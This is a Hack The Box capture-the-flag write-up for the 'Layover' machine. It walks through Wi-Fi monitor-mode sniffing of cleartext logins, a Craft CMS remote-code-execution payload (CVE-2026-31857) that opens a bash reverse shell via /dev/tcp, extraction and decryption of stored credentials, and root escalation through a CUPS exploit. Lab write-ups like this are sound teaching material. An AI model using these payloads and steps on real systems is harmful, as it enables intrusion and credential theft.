# Layover - Writup 

# Step 1 — Initial Scan: I started by scanning the target to identify the open TCP ports and determine which services were exposed.
```sudo nmap -p- 10.129.74.114 --min-rate 1000```


<img width="622" height="194" alt="Screenshot 2026-09-28 131216" src="https://github.com/user-attachments/assets/23bf4003-aa66-4de0-b6e3-58f8dce817d8" />


The scan revealed the available open ports on the target. These ports showed me which services were accessible and gave me the initial direction for further enumeration.

Step 2 — Connect via RDP : After identifying the accessible services, I used the provided `contractor` credentials to connect to the target through RDP.
```
xfreerdp /v:10.129.74.114 /u:contractor /p:'Contractor2026!' /cert:ignore
```


<img width="1023" height="794" alt="Screenshot 2026-09-28 131318" src="https://github.com/user-attachments/assets/af6a5393-a228-406d-a98d-19c8d26bc379" />

The command successfully opened an RDP session to the target as the `contractor` user, giving me access to the machine for further internal enumeration.

Step 3 — Network Interface Enumeration: Once I got access to the machine, I checked the available network interfaces to understand how the system was connected to the network.
```
- ip a 
```

<img width="1051" height="443" alt="Screenshot 2026-09-28 145847" src="https://github.com/user-attachments/assets/0b157969-8d6a-4cd6-932a-5c015b379ff7" />

The output showed multiple interfaces, including `wlan2` and `wlan3`. This indicated that the machine had more than one wireless interface, which could be useful for further network enumeration.

Step 4 — Discover the Wi-Fi Network : After finding the wireless interface `wlan2`, I checked the available Wi-Fi networks to identify the SSID that could be used.

```- nmcli device wifi list ```


<img width="991" height="136" alt="Screenshot 2026-09-28 150833" src="https://github.com/user-attachments/assets/ce44ecb6-9964-4cb8-a0b5-95bf63119335" />

The output showed the SSID **`HTB International WiFi`**, which gave me the network name needed for the next step.

Step 5 — Connect to the Wi-Fi : After identifying the SSID, I connected `wlan2` to the **HTB International WiFi** network.

```- nmcli device wifi connect 'HTB International WiFi' ifname wlan2 ```

<img width="1050" height="481" alt="Screenshot 2026-09-28 151645" src="https://github.com/user-attachments/assets/17ac04e8-602d-49c9-8501-1b8431984ff4" />

then the site is open:
<img width="868" height="631" alt="image" src="https://github.com/user-attachments/assets/6cba73b0-2b16-478d-9ff1-eba452f351aa" />

The connection was successful, and `wlan2` was assigned an IP address on the `10.13.37.0/24` network. This gave me access to the internal airport network and allowed me to reach the portal.

Step 6 — Access the Craft CMS Login Page : After connecting to the internal Wi-Fi network, I opened the airport portal and accessed the administrative login endpoint:
``` http://portal.international.htb/admin/login  ```
<img width="865" height="823" alt="image" src="https://github.com/user-attachments/assets/5c1af2c0-c5ac-420b-b2f4-943ab9db4906" />

This page revealed that the portal was running **Craft CMS** and presented a login form. At this point, I needed valid credentials to access the CMS.

Step 7 — Prepare `wlan3` for Monitor Mode : 
First, I prevented NetworkManager from managing the interface:
``` - nmcli device set wlan3 managed no ```
Then I brought the interface down so its mode could be changed:
``` - sudo ip link set wlan3 down ```
Next, I switched `wlan3` from normal managed mode to monitor mode:
``` - sudo iw dev wlan3 set type monitor ```
Finally, I brought the interface back up:
``` - sudo ip link set wlan3 up ```
<img width="818" height="174" alt="image" src="https://github.com/user-attachments/assets/3a35a5bc-f3b7-4c8b-b578-9c76f53f7dc0" />

After these commands, `wlan3` was ready to capture wireless traffic in **monitor mode**.

Step 8 — Capture and Analyze Wireless Traffic : 
After putting `wlan3` into monitor mode, I tuned it to **channel 6** so I could capture traffic on that wireless channel.
```- iw dev wlan3 set channel 6 ```

The interface was now listening on channel 6, which was the channel used for the relevant wireless traffic.

I then started capturing the traffic and saved it to a PCAP file for later analysis.
``` timeout 180 tcpdump -i wlan3 -nn -s0 -w channel6.pcap ```
The capture ran for 180 seconds and saved the collected packets into `channel6.pcap`.

Finally, I analyzed the capture and filtered for HTTP POST requests, which could contain submitted login credentials
```   
tshark -r channel6.pcap \
  -Y 'http.request.method == "POST"' \
  -T fields -e ip.src -e http.host -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value
```
<img width="1195" height="291" alt="Screenshot 2026-09-28 162929" src="https://github.com/user-attachments/assets/87d91de4-4091-4855-9b63-e687286e4543" />


The output revealed an HTTP POST request containing username and password fields. This gave me valid credentials that I could use to access the Craft CMS login page.

Step 9 — Log in to Craft CMS : After recovering the credentials from the wireless traffic, I used them on the Craft CMS login page

<img width="918" height="747" alt="Screenshot 2026-09-28 163427" src="https://github.com/user-attachments/assets/441be92d-f4ef-4f6b-8bdc-f16e44ae2ee6" />

The login was successful, giving me access to the **Craft CMS administrative panel** and allowing me to continue enumerating the application.
 
Step 10 — Identify the Craft CMS Version :  After logging into the CMS, I checked the installed Craft CMS version.

<img width="930" height="876" alt="Screenshot 2026-09-28 163651" src="https://github.com/user-attachments/assets/36022062-f39a-4243-801b-88ddd124763b" />

The application was running **Craft CMS 5.9.8**, and this version was associated with **CVE-2026-31857**.
This gave me a specific vulnerability to investigate before moving to the exploitation step.

Step 11 — Exploit CVE-2026-31857 : 
First, I started a Netcat listener on port `4444` to receive the reverse shell after exploiting the CMS.
```
- nc -lvnp 4444
```
Next, I logged into Craft CMS, opened the browser developer console with **F12**, and executed the following payload:
```
const body = {
  elementType: "craft\\elements\\Entry",
  siteId: 1,
  search: "",
  sectionId: 1,
  condition: {
    class: "craft\\elements\\conditions\\entries\\EntryCondition",
    elementType: "craft\\elements\\Entry",
    conditionRules: [
      {
        class: "craft\\elements\\conditions\\entries\\AuthorConditionRule",
        elementIds: `{{ ['bash -c "exec 3<>/dev/tcp/10.13.37.182/4444; exec 0<&3 1>&3 2>&3; exec bash -i"']|filter('system') }}`
      }
    ]
  }
};

fetch("/index.php?p=admin%2Factions%2Felement-search%2Fsearch", {
  method: "POST",
  credentials: "same-origin",
  headers: {
    "Accept": "application/json",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "X-CSRF-Token": Craft.csrfTokenValue
  },
  body: JSON.stringify(body)
})
.then(r => r.text())
.then(console.log);
```

<img width="1910" height="890" alt="Screenshot 2026-09-28 165608" src="https://github.com/user-attachments/assets/3e256b08-e621-4cc1-956c-4ef6b1f809cb" />

The payload triggered the vulnerable Craft CMS functionality and executed the reverse-shell command on the server.

The Netcat listener then received a connection from the target, giving me a shell as the **`www-data`** user. This confirmed that the vulnerability provided **remote code execution**.

Step 12 — Retrieve Database Credentials : After gaining a shell as `www-data`, I checked the application's `.env` file for stored configuration details.![[Screenshot 2026-09-28 165842.png]]
The output revealed the **database credentials** used by the Craft CMS application. I could then use these credentials to access the local database and look for additional information.

Step 13 — Access the Database : After finding the database credentials in the `.env` file, I used them to connect to the local MySQL database and queried the Craft settings table.
```
MYSQL_PWD='CraftDB_pw_2026' mysql \
  -h 127.0.0.1 -u craftuser -D craft -N -B \
  -e 'SELECT name,value FROM htbairways_settings;'

```

<img width="893" height="211" alt="Screenshot 2026-09-28 170416" src="https://github.com/user-attachments/assets/3a2750f1-dd96-48e8-b574-6dda583e7857" />

The query returned configuration values from the `htbairways_settings` table, including an encrypted value that could contain useful credentials. This gave me the information needed for the next step, where I attempted to decrypt the value.

Step 14 — Decrypt the Stored Credential : After finding the encrypted value in the database, I used the application's Yii `Security` class to decrypt it with the provided key.

```

cd /var/www/portal
php -r 'require "vendor/autoload.php"; $security = new yii\base\Security(); echo $security->decryptByKey(base64_decode($argv[1]), $argv[2]), PHP_EOL;' 'ENCRYPTED_VALUE' 'DECRYPTION_KEY'

```

<img width="592" height="162" alt="Screenshot 2026-09-28 170746" src="https://github.com/user-attachments/assets/948e17af-ef77-4940-8a65-8c72bf6c9e5c" />

The command successfully decrypted the stored value and revealed another set of credentials. These credentials could then be used to access the `aporter` user account.

Step 15 — SSH as `aporter` : After decrypting the credential, I used it to authenticate to the `aporter` account through SSH.
```
- ssh aporter@10.13.37.10
```


<img width="796" height="279" alt="Screenshot 2026-09-28 171044" src="https://github.com/user-attachments/assets/7260ef11-1cdc-4f88-bf1d-cb287d5fe5f1" />

The login was successful, giving me access to the `aporter` user account. From there, I was able to retrieve the **user flag** and continue with local privilege escalation enumeration.
user.txt done
<img width="582" height="198" alt="Screenshot 2026-09-28 171208" src="https://github.com/user-attachments/assets/0fee3ca0-a514-45fe-90fc-68e60870bd41" />



Step 16 — Identify the CUPS Vulnerability : 
After obtaining access as `aporter`, I performed local enumeration and found that the system was running **CUPS 2.4.16** as a root service

<img width="638" height="215" alt="Screenshot 2026-09-28 171339" src="https://github.com/user-attachments/assets/dc608885-cf10-4e60-b6a0-6e6f379d8c9d" />


The version was affected by **CVE-2026-34990**, so this provided a potential path for local privilege escalation from `aporter` to `root`.

Step 17 — Exploit CVE-2026-34990 : After identifying the vulnerable CUPS service, I used the available proof-of-concept to exploit **CVE-2026-34990**.

I first created the PoC file in `/tmp` and made it executable:
https://github.com/bara-almustafa/CVE-2026-34990-poc/blob/main/CVE-2026-34990.py
Then I executed the exploit with a privileged Bash shell:
```
nano CVE-2026-34990.py
chmod +x /tmp/CVE-2026-34990.py
python3 /tmp/CVE-2026-34990.py -c 'bash -p -i'
```

<img width="1162" height="485" alt="Screenshot 2026-09-28 173038" src="https://github.com/user-attachments/assets/9ef4c1fd-1a78-42bd-bbbc-3f9b74f011e1" />

The exploit successfully escalated my privileges from `aporter` to **root**. I then retrieved the **root flag**, completing the machine.

root.flag:
<img width="687" height="210" alt="Screenshot 2026-09-28 173225" src="https://github.com/user-attachments/assets/ab1994ff-b014-4a5a-9563-f5ab243e57c2" />
